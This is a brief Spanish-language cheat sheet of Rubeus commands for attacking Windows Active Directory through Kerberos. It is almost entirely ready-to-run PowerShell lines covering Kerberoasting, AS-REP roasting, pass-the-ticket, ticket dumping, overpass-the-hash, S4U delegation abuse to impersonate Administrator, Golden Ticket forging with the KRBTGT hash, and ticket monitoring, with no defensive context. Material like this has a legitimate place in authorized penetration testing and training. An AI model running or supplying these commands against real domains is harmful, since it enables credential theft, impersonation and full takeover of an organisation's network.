# Rubeus

Herramienta para ataques Kerberos desde Windows.

```powershell
# Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# AS-REP Roasting
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Obtener TGT
.\Rubeus.exe asktgt /user:usuario /password:contraseña /domain:empresa.local /dc:10.10.10.10 /ptt

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Dump de tickets actuales
.\Rubeus.exe dump /nowrap
.\Rubeus.exe klist

# Overpass-the-Hash (hash → TGT)
.\Rubeus.exe asktgt /user:usuario /rc4:NTHASH /domain:empresa.local /ptt
.\Rubeus.exe asktgt /user:usuario /aes256:AES_HASH /domain:empresa.local /ptt

# S4U (Constrained Delegation)
.\Rubeus.exe s4u /user:sqlsvc /rc4:NTHASH /impersonateuser:Administrator /msdsspn:"cifs/target" /ptt

# Golden Ticket
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:empresa.local /sid:DOMAIN_SID /user:FakeAdmin /ptt

# Monitorizar tickets nuevos (útil en Unconstrained Delegation)
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
```
